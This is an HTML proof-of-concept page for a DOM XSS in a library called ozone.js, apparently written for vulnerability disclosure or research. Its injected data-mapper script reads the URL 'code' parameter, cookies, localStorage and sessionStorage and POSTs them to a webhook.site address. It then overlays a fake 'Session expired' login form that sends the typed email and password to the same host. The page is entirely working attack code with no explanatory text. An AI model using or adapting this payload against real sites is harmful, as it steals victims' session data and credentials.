<!DOCTYPE html>
<html>
  <head>
    <title>PoC DOM XSS - ozone.js</title>
    <meta charset="UTF-8" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="ozone.js"></script>
  </head>
  <body>
    <select
      data-src-url="/api/data"
      data-mapper="() => {
        const params = new URLSearchParams(location.search);
        const code = params.get('code');

        const data = {
          code: code,
          cookie: document.cookie,
          localStorage: Object.fromEntries(Object.entries(localStorage)),
          sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
        };

        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
          method: 'POST',
          body: JSON.stringify(data)
        });

        // Inject phishing login form
        const form = document.createElement('form');
        form.innerHTML = `
          <div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999;font-family:sans-serif;padding:20px'>
            <h2 style='margin-bottom:10px;'>Session expired. Please login again</h2>
            <input type='text' id='user' placeholder='Email'/><br><br>
            <input type='password' id='pass' placeholder='Password'/><br><br>
            <button type='submit'>Login</button>
          </div>
        `;
        form.onsubmit = (e) => {
          e.preventDefault();
          const u = document.getElementById('user').value;
          const p = document.getElementById('pass').value;
          fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
            method: 'POST',
            body: JSON.stringify({ username: u, password: p })
          });
        };
        document.body.appendChild(form);
      }">
    </select>
  </body>
</html>
